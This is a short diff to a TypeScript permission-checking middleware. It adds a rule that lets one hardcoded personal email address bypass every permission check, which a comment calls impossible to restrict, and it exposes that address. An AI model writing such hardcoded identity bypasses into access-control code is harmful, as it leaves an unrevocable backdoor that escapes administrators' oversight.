@@ -274,7 +274,12 @@ export const checkPermission = (requiredPermission: string | string[]) => {
             return res.status(401).json({ error: 'Authentication required' });
         }
 
-        // 1. Super Admin (no permissions object or empty) has access to everything
+        // 1. Owner always has full access — cannot be restricted
+        if (req.user.email === 'dossoumaxime888@gmail.com') {
+            return next();
+        }
+
+        // 2. Super Admin (no permissions object or empty) has access to everything
         const userPermissions = req.user.permissions;
         if (!userPermissions || Object.keys(userPermissions).length === 0) {
             return next();
